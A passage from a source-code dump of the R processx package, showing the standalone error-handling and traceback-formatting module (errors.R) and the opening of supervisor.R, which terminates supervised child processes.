#   deparsed `call` column in the trace is not compatible with rlang.
#
# ### 3.0.2 -- 2022-08-01
#
# * Use a `procsrcref` column for processed source references.
#   Otherwise testthat (and probably other rlang based packages), will
#   pick up the `srcref` column, and they expect an `srcref` object there.
#
# ### 3.1.0 -- 2022-10-04
#
# * Add ANSI hyperlinks to stack traces, if we have a recent enough
#   cli package that supports this.
#
# ### 3.1.1 -- 2022-11-17
#
# * Use `[[` instead of `$` to fix some partial matches.
# * Use fully qualified `base::stop()` to enable overriding `stop()`
#   in a package. (Makes sense if compat files use `stop()`.
# * The `is_interactive()` function is now exported.
#
# ### 3.1.2 -- 2022-11-18
#
# * The `parent` condition can now be an interrupt.
#
# ### 3.1.3 -- 2023-01-15
#
# * Now we do not load packages when walking the trace.
#
# ### 3.1.4 -- 2023-04-13
#
# * `call.` can now be a frame environment as in `rlang::abort()`

err <- local({
  # -- dependencies -----------------------------------------------------
  rstudio_detect <- rstudio$detect

  # -- condition constructors -------------------------------------------

  #' Create a new condition
  #'
  #' @noRd
  #' @param ... Parts of the error message, they will be converted to
  #'   character and then concatenated, like in [stop()].
  #' @param call. A call object to include in the condition, or `TRUE`
  #'   or `NULL`, meaning that `throw()` should add a call object
  #'   automatically. If `FALSE`, then no call is added.
  #' @param srcref Alternative source reference object to use instead of
  #'   the one of `call.`.
  #' @param domain Translation domain, see [stop()]. We set this to
  #'   `NA` by default, which means that no translation occurs. This
  #'   has the benefit that the error message is not re-encoded into
  #'   the native locale.
  #' @return Condition object. Currently a list, but you should not rely
  #'   on that.

  new_cond <- function(..., call. = TRUE, srcref = NULL, domain = NA) {
    message <- .makeMessage(..., domain = domain)
    structure(
      list(message = message, call = call., srcref = srcref),
      class = c("condition")
    )
  }

  #' Create a new error condition
  #'
  #' It also adds the `rlib_error` class.
  #'
  #' @noRd
  #' @param ... Passed to `new_cond()`.
  #' @param call. Passed to `new_cond()`.
  #' @param srcref Passed tp `new_cond()`.
  #' @param domain Passed to `new_cond()`.
  #' @return Error condition object with classes `rlib_error`, `error`
  #'   and `condition`.

  new_error <- function(..., call. = TRUE, srcref = NULL, domain = NA) {
    cond <- new_cond(..., call. = call., domain = domain, srcref = srcref)
    class(cond) <- c("rlib_error_3_0", "rlib_error", "error", "condition")
    cond
  }

  # -- throwing conditions ----------------------------------------------

  #' Throw a condition
  #'
  #' If the condition is an error, it will also call [stop()], after
  #' signalling the condition first. This means that if the condition is
  #' caught by an exiting handler, then [stop()] is not called.
  #'
  #' @noRd
  #' @param cond Condition object to throw. If it is an error condition,
  #'   then it calls [stop()].
  #' @param parent Parent condition.
  #' @param frame The throwing context. Can be used to hide frames from
  #'   the backtrace.

  throw <- throw_error <- function(
    cond,
    parent = NULL,
    call = parent.frame(),
    frame = environment()
  ) {
    if (!inherits(cond, "condition")) {
      cond <- new_error(cond)
    }
    if (!is.null(parent) && !inherits(parent, "condition")) {
      throw(new_error("Parent condition must be a condition object"))
    }

    if (isTRUE(cond[["call"]])) {
      cond[["call"]] <- frame_call(call)
    } else if (identical(cond[["call"]], FALSE)) {
      cond[["call"]] <- NULL
    } else if (is.environment(cond[["call"]])) {
      cond[["call"]] <- frame_call(cond[["call"]])
    }

    cond <- process_call(cond)

    if (!is.null(parent)) {
      cond$parent <- process_call(parent)
    }

    # We can set an option to always add the trace to the thrown
    # conditions. This is useful for example in context that always catch
    # errors, e.g. in testthat tests or knitr. This options is usually not
    # set and we signal the condition here
    always_trace <- isTRUE(getOption("rlib_error_always_trace"))
    .hide_from_trace <- 1L
    # .error_frame <- cond
    if (!always_trace) {
      signalCondition(cond)
    }

    if (is.null(cond$`_pid`)) {
      cond$`_pid` <- Sys.getpid()
    }
    if (is.null(cond$`_timestamp`)) {
      cond$`_timestamp` <- Sys.time()
    }

    # If we get here that means that the condition was not caught by
    # an exiting handler. That means that we need to create a trace.
    # If there is a hand-constructed trace already in the error object,
    # then we'll just leave it there.
    if (is.null(cond$trace)) {
      cond <- add_trace_back(cond, frame = frame)
    }

    # Set up environment to store .Last.error, it will be just before
    # baseenv(), so it is almost as if it was in baseenv() itself, like
    # .Last.value. We save the print methods here as well, and then they
    # will be found automatically.
    if (!"org:r-lib" %in% search()) {
      do.call(
        "attach",
        list(new.env(), pos = length(search()), name = "org:r-lib")
      )
    }
    env <- as.environment("org:r-lib")
    env$.Last.error <- cond
    env$.Last.error.trace <- cond$trace

    # If we always wanted a trace, then we signal the condition here
    if (always_trace) {
      signalCondition(cond)
    }

    # If this is not an error, then we'll just return here. This allows
    # throwing interrupt conditions for example, with the same UI.
    if (!inherits(cond, "error")) {
      return(invisible())
    }
    .hide_from_trace <- NULL

    # Top-level handler, this is intended for testing only for now,
    # and its design might change.
    if (
      !is.null(th <- getOption("rlib_error_handler")) &&
        is.function(th)
    ) {
      return(th(cond))
    }

    # In non-interactive mode, we print the error + the traceback
    # manually, to make sure that it won't be truncated by R's error
    # message length limit.
    out <- format(
      cond,
      trace = !is_interactive(),
      class = FALSE,
      full = !is_interactive()
    )
    writeLines(out, con = default_output())

    # Dropping the classes and adding "duplicate_condition" is a workaround
    # for the case when we have non-exiting handlers on throw()-n
    # conditions. These would get the condition twice, because stop()
    # will also signal it. If we drop the classes, then only handlers
    # on "condition" objects (i.e. all conditions) get duplicate signals.
    # This is probably quite rare, but for this rare case they can also
    # recognize the duplicates from the "duplicate_condition" extra class.
    class(cond) <- c("duplicate_condition", "condition")

    # Turn off the regular error printing to avoid printing
    # the error twice.
    opts <- options(show.error.messages = FALSE)
    on.exit(options(opts), add = TRUE)

    base::stop(cond)
  }

  # -- rethrow with parent -----------------------------------------------

  #' Re-throw an error with a better error message
  #'
  #' Evaluate `expr` and if it errors, then throw a new error `err`,
  #' with the original error set as its parent.
  #'
  #' @noRd
  #' @param expr Expression to evaluate.
  #' @param err Error object or message to use for the child error.
  #' @param call Call to use in the re-thrown error. See `throw()`.

  chain_error <- function(expr, err, call = sys.call(-1), srcref = NULL) {
    .hide_from_trace <- 1
    force(call)
    srcref <- srcref %||% utils::getSrcref(sys.call())
    withCallingHandlers(
      {
        expr
      },
      error = function(e) {
        .hide_from_trace <- 0:1
        e$srcref <- srcref
        e$procsrcref <- NULL
        if (!inherits(err, "condition")) {
          err <- new_error(err, call. = call)
        }
        throw_error(err, parent = e)
      }
    )
  }

  # -- rethrowing conditions from C code ---------------------------------

  #' Version of .Call that throw()s errors
  #'
  #' It re-throws error from compiled code. If the error had class
  #' `simpleError`, like all errors, thrown via `error()` in C do, it also
  #' adds the `c_error` class.
  #'
  #' @noRd
  #' @param .NAME Compiled function to call, see [.Call()].
  #' @param ... Function arguments, see [.Call()].
  #' @return Result of the call.

  chain_call <- function(.NAME, ...) {
    .hide_from_trace <- 1:3 # withCallingHandlers + do.call + .handleSimpleError (?)
    call <- sys.call()
    call1 <- sys.call(-1)
    srcref <- utils::getSrcref(call)
    withCallingHandlers(
      do.call(".Call", list(.NAME, ...)),
      error = function(e) {
        .hide_from_trace <- 0:1
        e$srcref <- srcref
        e$procsrcref <- NULL
        e[["call"]] <- call
        name <- native_name(.NAME)
        err <- new_error("Native call to `", name, "` failed", call. = call1)
        cerror <- if (inherits(e, "simpleError")) "c_error"
        class(err) <- c(
          cerror,
          "rlib_error_3_0",
          "rlib_error",
          "error",
          "condition"
        )
        throw_error(err, parent = e)
      }
    )
  }

  package_env <- topenv()

  #' Version of entrace_call that supports cleancall
  #'
  #' This function is the same as `entrace_call()`, except that it
  #' uses cleancall's [.Call()] wrapper, to enable resource cleanup.
  #' See https://github.com/r-lib/cleancall#readme for more about
  #' resource cleanup.
  #'
  #' @noRd
  #' @param .NAME Compiled function to call, see [.Call()].
  #' @param ... Function arguments, see [.Call()].
  #' @return Result of the call.

  chain_clean_call <- function(.NAME, ...) {
    .hide_from_trace <- 1:3
    call <- sys.call()
    call1 <- sys.call(-1)
    srcref <- utils::getSrcref(call)
    withCallingHandlers(
      package_env$call_with_cleanup(.NAME, ...),
      error = function(e) {
        .hide_from_trace <- 0:1
        e$srcref <- srcref
        e$procsrcref <- NULL
        e[["call"]] <- call
        name <- native_name(.NAME)
        err <- new_error("Native call to `", name, "` failed", call. = call1)
        cerror <- if (inherits(e, "simpleError")) "c_error"
        class(err) <- c(
          cerror,
          "rlib_error_3_0",
          "rlib_error",
          "error",
          "condition"
        )
        throw_error(err, parent = e)
      }
    )
  }

  # -- create traceback -------------------------------------------------

  #' Create a traceback
  #'
  #' `[throw()` calls this function automatically if an error is not caught,
  #' so there is currently not much use to call it directly.
  #'
  #' @param cond Condition to add the trace to
  #' @param frame Use this context to hide some frames from the traceback.
  #'
  #' @return A condition object, with the trace added.

  add_trace_back <- function(cond, frame = NULL) {
    idx <- seq_len(sys.parent(1L))
    frames <- sys.frames()[idx]

    # TODO: remove embedded objects from calls
    calls <- as.list(sys.calls()[idx])
    parents <- sys.parents()[idx]
    namespaces <- unlist(lapply(
      seq_along(frames),
      function(i) {
        if (is_operator(calls[[i]])) {
          "o"
        } else {
          env_label(topenvx(environment(sys.function(i))))
        }
      }
    ))
    pids <- rep(cond$`_pid` %||% Sys.getpid(), length(calls))

    mch <- match(format(frame), sapply(frames, format))
    if (is.na(mch)) {
      visibles <- TRUE
    } else {
      visibles <- c(rep(TRUE, mch), rep(FALSE, length(frames) - mch))
    }

    scopes <- vapply(idx, FUN.VALUE = character(1), function(i) {
      tryCatch(
        get_call_scope(calls[[i]], namespaces[[i]]),
        error = function(e) ""
      )
    })

    namespaces <- ifelse(scopes %in% c("::", ":::"), namespaces, NA_character_)
    funs <- ifelse(
      is.na(namespaces),
      ifelse(scopes != "", paste0(scopes, " "), ""),
      paste0(namespaces, scopes)
    )
    funs <- paste0(
      funs,
      vapply(calls, function(x) format_name(x[[1]])[1], character(1))
    )
    visibles <- visibles & mark_invisible_frames(funs, frames)

    pcs <- lapply(calls, function(c) process_call(list(call = c)))
    calls <- lapply(pcs, "[[", "call")
    srcrefs <- I(lapply(pcs, "[[", "srcref"))
    procsrcrefs <- I(lapply(pcs, "[[", "procsrcref"))

    cond$trace <- new_trace(
      calls,
      parents,
      visibles = visibles,
      namespaces = namespaces,
      scopes = scopes,
      srcrefs = srcrefs,
      procsrcrefs = procsrcrefs,
      pids
    )

    cond
  }

  is_operator <- function(cl) {
    is.call(cl) &&
      length(cl) >= 1 &&
      is.symbol(cl[[1]]) &&
      grepl("^[^.a-zA-Z]", as.character(cl[[1]]))
  }

  mark_invisible_frames <- function(funs, frames) {
    visibles <- rep(TRUE, length(frames))
    hide <- lapply(frames, "[[", ".hide_from_trace")
    w_hide <- unlist(mapply(
      seq_along(hide),
      hide,
      FUN = function(i, w) {
        i + w
      },
      SIMPLIFY = FALSE
    ))
    w_hide <- w_hide[w_hide <= length(frames)]
    visibles[w_hide] <- FALSE

    hide_from <- which(funs %in% names(invisible_frames))
    for (start in hide_from) {
      hide_this <- invisible_frames[[funs[start]]]
      for (i in seq_along(hide_this)) {
        if (start + i > length(funs)) {
          break
        }
        if (funs[start + i] != hide_this[i]) {
          break
        }
        visibles[start + i] <- FALSE
      }
    }

    visibles
  }

  invisible_frames <- list(
    "base::source" = c("base::withVisible", "base::eval", "base::eval"),
    "base::stop" = "base::.handleSimpleError",
    "cli::cli_abort" = c(
      "rlang::abort",
      "rlang:::signal_abort",
      "base::signalCondition"
    ),
    "rlang::abort" = c("rlang:::signal_abort", "base::signalCondition")
  )

  call_name <- function(x) {
    if (is.call(x)) {
      if (is.symbol(x[[1]])) {
        as.character(x[[1]])
      } else if (x[[1]][[1]] == quote(`::`) || x[[1]][[1]] == quote(`:::`)) {
        as.character(x[[1]][[2]])
      } else {
        NULL
      }
    } else {
      NULL
    }
  }

  get_call_scope <- function(call, ns) {
    if (is.na(ns)) {
      return("global")
    }
    if (!is.call(call)) {
      return("")
    }
    if (
      is.call(call[[1]]) &&
        (call[[1]][[1]] == quote(`::`) || call[[1]][[1]] == quote(`:::`))
    ) {
      return("")
    }
    if (ns == "base") {
      return("::")
    }
    if (!ns %in% loadedNamespaces()) {
      return("")
    }
    name <- call_name(call)
    if (!ns %in% loadedNamespaces()) {
      return("::")
    }
    nsenv <- asNamespace(ns)$.__NAMESPACE__.
    if (is.null(nsenv)) {
      return("::")
    }
    if (is.null(nsenv$exports)) {
      return(":::")
    }
    if (exists(name, envir = nsenv$exports, inherits = FALSE)) {
      "::"
    } else if (exists(name, envir = asNamespace(ns), inherits = FALSE)) {
      ":::"
    } else {
      "local"
    }
  }

  topenvx <- function(x) {
    topenv(x, matchThisEnv = err_env)
  }

  new_trace <- function(
    calls,
    parents,
    visibles,
    namespaces,
    scopes,
    srcrefs,
    procsrcrefs,
    pids
  ) {
    trace <- data.frame(
      stringsAsFactors = FALSE,
      parent = parents,
      visible = visibles,
      namespace = namespaces,
      scope = scopes,
      srcref = srcrefs,
      procsrcref = procsrcrefs,
      pid = pids
    )
    trace[["call"]] <- calls

    class(trace) <- c("rlib_trace_3_0", "rlib_trace", "tbl", "data.frame")
    trace
  }

  env_label <- function(env) {
    nm <- env_name(env)
    if (nzchar(nm)) {
      nm
    } else {
      env_address(env)
    }
  }

  env_address <- function(env) {
    class(env) <- "environment"
    sub("^.*(0x[0-9a-f]+)>$", "\\1", format(env), perl = TRUE)
  }

  env_name <- function(env) {
    if (identical(env, err_env)) {
      return(env_name(package_env))
    }
    if (identical(env, globalenv())) {
      return(NA_character_)
    }
    if (identical(env, baseenv())) {
      return("base")
    }
    if (identical(env, emptyenv())) {
      return("empty")
    }
    nm <- environmentName(env)
    if (isNamespace(env)) {
      return(nm)
    }
    nm
  }

  # -- S3 methods -------------------------------------------------------

  format_error <- function(
    x,
    trace = FALSE,
    class = FALSE,
    advice = !trace,
    full = trace,
    header = TRUE,
    ...
  ) {
    if (has_cli()) {
      format_error_cli(x, trace, class, advice, full, header, ...)
    } else {
      format_error_plain(x, trace, class, advice, full, header, ...)
    }
  }

  print_error <- function(x, trace = TRUE, class = TRUE, advice = !trace, ...) {
    writeLines(format_error(x, trace, class, advice, ...))
  }

  format_trace <- function(x, ...) {
    if (has_cli()) {
      format_trace_cli(x, ...)
    } else {
      format_trace_plain(x, ...)
    }
  }

  print_trace <- function(x, ...) {
    writeLines(format_trace(x, ...))
  }

  cnd_message <- function(cond) {
    paste(cnd_message_(cond, full = FALSE), collapse = "\n")
  }

  cnd_message_ <- function(cond, full = FALSE) {
    if (has_cli()) {
      cnd_message_cli(cond, full)
    } else {
      cnd_message_plain(cond, full)
    }
  }

  # -- format API -------------------------------------------------------

  format_advice <- function(x) {
    if (has_cli()) {
      format_advice_cli(x)
    } else {
      format_advice_plain(x)
    }
  }

  format_call <- function(call) {
    if (has_cli()) {
      format_call_cli(call)
    } else {
      format_call_plain(call)
    }
  }

  format_class <- function(x) {
    if (has_cli()) {
      format_class_cli(x)
    } else {
      format_class_plain(x)
    }
  }

  format_error_heading <- function(x, prefix = NULL) {
    if (has_cli()) {
      format_error_heading_cli(x, prefix)
    } else {
      format_error_heading_plain(x, prefix)
    }
  }

  format_header_line <- function(x, prefix = NULL) {
    if (has_cli()) {
      format_header_line_cli(x, prefix)
    } else {
      format_header_line_plain(x, prefix)
    }
  }

  format_srcref <- function(call, srcref = NULL) {
    if (has_cli()) {
      format_srcref_cli(call, srcref)
    } else {
      format_srcref_plain(call, srcref)
    }
  }

  # -- condition message with cli ---------------------------------------

  cnd_message_robust <- function(cond) {
    class(cond) <- setdiff(class(cond), "rlib_error_3_0")
    conditionMessage(cond) %||%
      (if (inherits(cond, "interrupt")) "interrupt") %||%
      ""
  }

  cnd_message_cli <- function(cond, full = FALSE) {
    exp <- paste0(cli::col_yellow("!"), " ")
    add_exp <- is.null(names(cond$message))
    msg <- cnd_message_robust(cond)

    c(
      paste0(if (add_exp) exp, msg),
      if (inherits(cond$parent, "condition")) {
        msg <- if (full && inherits(cond$parent, "rlib_error_3_0")) {
          format(
            cond$parent,
            trace = FALSE,
            full = TRUE,
            class = FALSE,
            header = FALSE,
            advice = FALSE
          )
        } else if (inherits(cond$parent, "interrupt")) {
          "interrupt"
        } else {
          conditionMessage(cond$parent)
        }
        add_exp <- substr(cli::ansi_strip(msg[1]), 1, 1) != "!"
        if (add_exp) {
          msg[1] <- paste0(exp, msg[1])
        }
        c(format_header_line_cli(cond$parent, prefix = "Caused by error"), msg)
      }
    )
  }

  # -- condition message w/o cli ----------------------------------------

  cnd_message_plain <- function(cond, full = FALSE) {
    exp <- "! "
    add_exp <- is.null(names(cond$message))
    c(
      paste0(if (add_exp) exp, cnd_message_robust(cond)),
      if (inherits(cond$parent, "condition")) {
        msg <- if (full && inherits(cond$parent, "rlib_error_3_0")) {
          format(
            cond$parent,
            trace = FALSE,
            full = TRUE,
            class = FALSE,
            header = FALSE,
            advice = FALSE
          )
        } else if (inherits(cond$parent, "interrupt")) {
          "interrupt"
        } else {
          conditionMessage(cond$parent)
        }
        add_exp <- substr(msg[1], 1, 1) != "!"
        if (add_exp) {
          msg[1] <- paste0(exp, msg[1])
        }
        c(
          format_header_line_plain(cond$parent, prefix = "Caused by error"),
          msg
        )
      }
    )
  }

  # -- printing error with cli ------------------------------------------

  # Error parts:
  # - "Error:" or "Error in " prefix, the latter if the error has a call
  # - the call, possibly syntax highlightedm possibly trimmed (?)
  # - source ref, with link to the file, potentially in a new line in cli
  # - error message, just `conditionMessage()`
  # - advice about .Last.error and/or .Last.error.trace

  format_error_cli <- function(
    x,
    trace = TRUE,
    class = TRUE,
    advice = !trace,
    full = trace,
    header = TRUE,
    ...
  ) {
    p_class <- if (class) format_class_cli(x)
    p_header <- if (header) format_header_line_cli(x)
    p_msg <- cnd_message_cli(x, full)
    p_advice <- if (advice) format_advice_cli(x) else NULL
    p_trace <- if (trace && !is.null(x$trace)) {
      c("---", "Backtrace:", format_trace_cli(x$trace))
    }

    c(p_class, p_header, p_msg, p_advice, p_trace)
  }

  format_header_line_cli <- function(x, prefix = NULL) {
    p_error <- format_error_heading_cli(x, prefix)
    p_call <- format_call_cli(conditionCall(x))
    p_srcref <- format_srcref_cli(p_call, x$procsrcref %||% x$srcref)
    paste0(p_error, p_call, p_srcref, if (!is.null(p_call)) ":")
  }

  format_class_cli <- function(x) {
    cls <- unique(setdiff(class(x), "condition"))
    cls # silence codetools
    cli::format_inline("{.cls {cls}}")
  }

  format_error_heading_cli <- function(x, prefix = NULL) {
    str_error <- if (is.null(prefix)) {
      cli::style_bold(cli::col_yellow("Error"))
    } else {
      cli::style_bold(paste0(prefix))
    }
    if (is.null(conditionCall(x))) {
      paste0(str_error, ": ")
    } else {
      paste0(str_error, " in ")
    }
  }

  format_call_cli <- function(call) {
    if (is.null(call)) {
      NULL
    } else {
      cl <- trimws(format(call))
      if (length(cl) > 1) {
        cl <- paste0(cl[1], " ", cli::symbol$ellipsis)
      }
      cli::format_inline("{.code {cl}}")
    }
  }

  format_srcref_cli <- function(call, srcref = NULL) {
    ref <- get_srcref(call, srcref)
    if (is.null(ref)) {
      return("")
    }

    link <- if (ref$file != "") {
      if (Sys.getenv("R_CLI_HYPERLINK_STYLE") == "iterm") {
        cli::style_hyperlink(
          cli::format_inline("{basename(ref$file)}:{ref$line}:{ref$col}"),
          paste0("file://", ref$file, "#", ref$line, ":", ref$col)
        )
      } else {
        cli::style_hyperlink(
          cli::format_inline("{basename(ref$file)}:{ref$line}:{ref$col}"),
          paste0("file://", ref$file),
          params = c(line = ref$line, col = ref$col)
        )
      }
    } else {
      paste0("line ", ref$line)
    }

    cli::col_silver(paste0(" at ", link))
  }

  str_advice <- "Type .Last.error to see the more details."

  format_advice_cli <- function(x) {
    cli::col_silver(str_advice)
  }

  format_trace_cli <- function(x, ...) {
    x$num <- seq_len(nrow(x))

    scope <- ifelse(
      is.na(x$namespace),
      ifelse(x$scope != "", paste0(x$scope, " "), ""),
      paste0(x$namespace, x$scope)
    )

    visible <- if ("visible" %in% names(x)) {
      x$visible
    } else {
      rep(TRUE, nrow(x))
    }

    srcref <- if ("srcref" %in% names(x) || "procsrcref" %in% names(x)) {
      vapply(
        seq_len(nrow(x)),
        function(i) {
          format_srcref_cli(
            x[["call"]][[i]],
            x$procsrcref[[i]] %||% x$srcref[[i]]
          )
        },
        character(1)
      )
    } else {
      unname(vapply(x[["call"]], format_srcref_cli, character(1)))
    }

    lines <- paste0(
      cli::col_silver(format(x$num), ". "),
      ifelse(visible, "", "| "),
      scope,
      vapply(
        seq_along(x[["call"]]),
        function(i) {
          format_trace_call_cli(x[["call"]][[i]], x$namespace[[i]])
        },
        character(1)
      ),
      srcref
    )

    lines[!visible] <- cli::col_silver(cli::ansi_strip(
      lines[!visible],
      link = FALSE
    ))

    lines
  }

  format_trace_call_cli <- function(call, ns = "") {
    envir <- tryCatch(
      {
        if (!ns %in% loadedNamespaces()) {
          stop("no")
        }
        asNamespace(ns)
      },
      error = function(e) .GlobalEnv
    )
    cl <- trimws(format(call))
    if (length(cl) > 1) {
      cl <- paste0(cl[1], " ", cli::symbol$ellipsis)
    }
    # Older cli does not have 'envir'.
    if ("envir" %in% names(formals(cli::code_highlight))) {
      fmc <- cli::code_highlight(cl, envir = envir)[1]
    } else {
      fmc <- cli::code_highlight(cl)[1]
    }
    cli::ansi_strtrim(fmc, cli::console_width() - 5)
  }

  # ----------------------------------------------------------------------

  format_error_plain <- function(
    x,
    trace = TRUE,
    class = TRUE,
    advice = !trace,
    full = trace,
    header = TRUE,
    ...
  ) {
    p_class <- if (class) format_class_plain(x)
    p_header <- if (header) format_header_line_plain(x)
    p_msg <- cnd_message_plain(x, full)
    p_advice <- if (advice) format_advice_plain(x) else NULL
    p_trace <- if (trace && !is.null(x$trace)) {
      c("---", "Backtrace:", format_trace_plain(x$trace))
    }

    c(p_class, p_header, p_msg, p_advice, p_trace)
  }

  format_trace_plain <- function(x, ...) {
    x$num <- seq_len(nrow(x))

    scope <- ifelse(
      is.na(x$namespace),
      ifelse(x$scope != "", paste0(x$scope, " "), ""),
      paste0(x$namespace, x$scope)
    )

    visible <- if ("visible" %in% names(x)) {
      x$visible
    } else {
      rep(TRUE, nrow(x))
    }

    srcref <- if ("srcref" %in% names(x) || "procsrfref" %in% names(x)) {
      vapply(
        seq_len(nrow(x)),
        function(i) {
          format_srcref_plain(
            x[["call"]][[i]],
            x$procsrcref[[i]] %||% x$srcref[[i]]
          )
        },
        character(1)
      )
    } else {
      unname(vapply(x[["call"]], format_srcref_plain, character(1)))
    }

    lines <- paste0(
      paste0(format(x$num), ". "),
      ifelse(visible, "", "| "),
      scope,
      vapply(x[["call"]], format_trace_call_plain, character(1)),
      srcref
    )

    lines
  }

  format_advice_plain <- function(x, ...) {
    str_advice
  }

  format_header_line_plain <- function(x, prefix = NULL) {
    p_error <- format_error_heading_plain(x, prefix)
    p_call <- format_call_plain(conditionCall(x))
    p_srcref <- format_srcref_plain(
      conditionCall(x),
      x$procsrcref %||% x$srcref
    )
    paste0(p_error, p_call, p_srcref, if (!is.null(conditionCall(x))) ":")
  }

  format_error_heading_plain <- function(x, prefix = NULL) {
    str_error <- if (is.null(prefix)) "Error" else prefix
    if (is.null(conditionCall(x))) {
      paste0(str_error, ": ")
    } else {
      paste0(str_error, " in ")
    }
  }

  format_class_plain <- function(x) {
    cls <- unique(setdiff(class(x), "condition"))
    paste0("<", paste(cls, collapse = "/"), ">")
  }

  format_call_plain <- function(call) {
    if (is.null(call)) {
      NULL
    } else {
      cl <- trimws(format(call))
      if (length(cl) > 1) {
        cl <- paste0(cl[1], " ...")
      }
      paste0("`", cl, "`")
    }
  }

  format_srcref_plain <- function(call, srcref = NULL) {
    ref <- get_srcref(call, srcref)
    if (is.null(ref)) {
      return("")
    }

    link <- if (ref$file != "") {
      paste0(basename(ref$file), ":", ref$line, ":", ref$col)
    } else {
      paste0("line ", ref$line)
    }

    paste0(" at ", link)
  }

  format_trace_call_plain <- function(call) {
    fmc <- trimws(format(call)[1])
    if (length(fmc) > 1) {
      fmc <- paste0(fmc[1], " ...")
    }
    strtrim(fmc, getOption("width") - 5)
  }

  # -- utilities ---------------------------------------------------------

  cli_version <- function() {
    # this loads cli!
    package_version(asNamespace("cli")[[".__NAMESPACE__."]]$spec[["version"]])
  }

  has_cli <- function() {
    "cli" %in% loadedNamespaces() && cli_version() >= "3.3.0"
  }

  `%||%` <- function(l, r) if (is.null(l)) r else l

  bytes <- function(x) {
    nchar(x, type = "bytes")
  }

  minimize_call <- function(call) {
    if (!is.call(call)) return(call)
    dep <- deparse(call, nlines = 2)
    result <- tryCatch(str2lang(dep[[1L]]), error = function(e) NULL)
    if (!is.null(result)) return(result)
    tryCatch(as.call(list(call[[1L]], quote(...))), error = function(e) NULL)
  }

  process_call <- function(cond) {
    cond[c("call", "srcref", "procsrcref")] <- list(
      call = minimize_call(cond[["call"]]),
      srcref = NULL,
      procsrcref = get_srcref(cond[["call"]], cond$procsrcref %||% cond$srcref)
    )
    cond
  }

  get_srcref <- function(call, srcref = NULL) {
    ref <- srcref %||% utils::getSrcref(call)
    if (is.null(ref)) {
      return(NULL)
    }
    if (inherits(ref, "processed_srcref")) {
      return(ref)
    }
    file <- utils::getSrcFilename(ref, full.names = TRUE)[1]
    if (is.na(file)) {
      file <- ""
    }
    line <- utils::getSrcLocation(ref) %||% ""
    col <- utils::getSrcLocation(ref, which = "column") %||% ""
    structure(
      list(file = file, line = line, col = col),
      class = "processed_srcref"
    )
  }

  is_interactive <- function() {
    opt <- getOption("rlib_interactive")
    if (isTRUE(opt)) {
      TRUE
    } else if (identical(opt, FALSE)) {
      FALSE
    } else if (tolower(getOption("knitr.in.progress", "false")) == "true") {
      FALSE
    } else if (
      tolower(getOption("rstudio.notebook.executing", "false")) == "true"
    ) {
      FALSE
    } else if (identical(Sys.getenv("TESTTHAT"), "true")) {
      FALSE
    } else {
      interactive()
    }
  }

  no_sink <- function() {
    sink.number() == 0 && sink.number("message") == 2
  }

  rstudio_stdout <- function() {
    rstudio <- rstudio_detect()
    rstudio$type %in%
      c(
        "rstudio_console",
        "rstudio_console_starting",
        "rstudio_build_pane",
        "rstudio_job",
        "rstudio_render_pane"
      )
  }

  default_output <- function() {
    if ((is_interactive() || rstudio_stdout()) && no_sink()) {
      stdout()
    } else {
      stderr()
    }
  }

  onload_hook <- function() {
    reg_env <- Sys.getenv("R_LIB_ERROR_REGISTER_PRINT_METHODS", "TRUE")
    if (tolower(reg_env) != "false") {
      registerS3method("format", "rlib_error_3_0", format_error, baseenv())
      registerS3method("format", "rlib_trace_3_0", format_trace, baseenv())
      registerS3method("print", "rlib_error_3_0", print_error, baseenv())
      registerS3method("print", "rlib_trace_3_0", print_trace, baseenv())
      registerS3method(
        "conditionMessage",
        "rlib_error_3_0",
        cnd_message,
        baseenv()
      )
    }
  }

  native_name <- function(x) {
    if (inherits(x, "NativeSymbolInfo")) {
      x$name
    } else {
      format(x)
    }
  }

  # There is no format() for 'name' in R 3.6.x and before
  format_name <- function(x) {
    if (is.name(x)) {
      as.character(x)
    } else {
      format(x)
    }
  }

  frame_call <- function(frame) {
    frames <- sys.frames()
    for (i in seq_along(frames)) {
      if (identical(frames[[i]], frame)) {
        return(sys.call(i))
      }
    }
    NULL
  }

  # Useful for snapshots so that they print without an unstable backtrace.
  # Call `register_testthat_print()` before running tests.
  testthat_print_error <- function(x, ...) {
    x[["trace"]] <- NULL
    x[["srcref"]] <- NULL
    x[["procsrcref"]] <- NULL
    attr(x[["call"]], "srcref") <- NULL
    print(x)
  }

  registered <- FALSE
  register_testthat_print <- function() {
    if (!registered) {
      registerS3method(
        "testthat_print",
        "rlib_error",
        testthat_print_error,
        asNamespace("testthat")
      )
      registered <<- TRUE
    }
  }

  # -- public API --------------------------------------------------------

  err_env <- environment()
  parent.env(err_env) <- baseenv()

  structure(
    list(
      .internal = err_env,
      new_cond = new_cond,
      new_error = new_error,
      throw = throw,
      throw_error = throw_error,
      chain_error = chain_error,
      chain_call = chain_call,
      chain_clean_call = chain_clean_call,
      add_trace_back = add_trace_back,
      process_call = process_call,
      onload_hook = onload_hook,
      is_interactive = is_interactive,
      register_testthat_print = register_testthat_print,
      format = list(
        advice = format_advice,
        call = format_call,
        class = format_class,
        error = format_error,
        error_heading = format_error_heading,
        header_line = format_header_line,
        srcref = format_srcref,
        trace = format_trace
      )
    ),
    class = c("standalone_errors", "standalone")
  )
})

# These are optional, and feel free to remove them if you prefer to
# call them through the `err` object.

new_cond <- err$new_cond
new_error <- err$new_error
throw <- err$throw
throw_error <- err$throw_error
chain_error <- err$chain_error
chain_call <- err$chain_call
chain_clean_call <- err$chain_clean_call
````

### `px390/processx/R/supervisor.R`

````r
# Stores information about the supervisor process
supervisor_info <- new.env()

reg.finalizer(
  supervisor_info,
  function(s) {
    # Pass s to `supervisor_kill`, in case the GC event happens _after_ a new
    # `processx:::supervisor_info` has been created and the name
    # `supervisor_info` is bound to the new object. This could happen if the
    # package is unloaded and reloaded.
    supervisor_kill2(s)
  },
  onexit = TRUE
)

#' Terminate all supervised processes and the supervisor process itself as
#' well
#'
#' On Unix the supervisor sends a `SIGTERM` signal to all supervised
#' processes, and gives them five seconds to quit, before sending a
#' `SIGKILL` signal. Then the supervisor itself terminates.
#'
#' Windows is similar, but instead of `SIGTERM`, a console CTRL+C interrupt
#' is sent first, then a `WM_CLOSE` message is sent to the windows of the
#' supervised processes, if they have windows.
#'
#' @keywords internal
#' @export

supervisor_kill <- function() {
  supervisor_kill2()
}

# This takes an object s, because a new `supervisor_info` object could have been
# created.
supervisor_kill2 <- function(s = supervisor_info) {
  if (is.null(s$pid)) {
    return()
  }

  if (!is.null(s$stdin) && is_pipe_open(s$stdin)) {
    write_lines_named_pipe(s$stdin, "kill")
  }

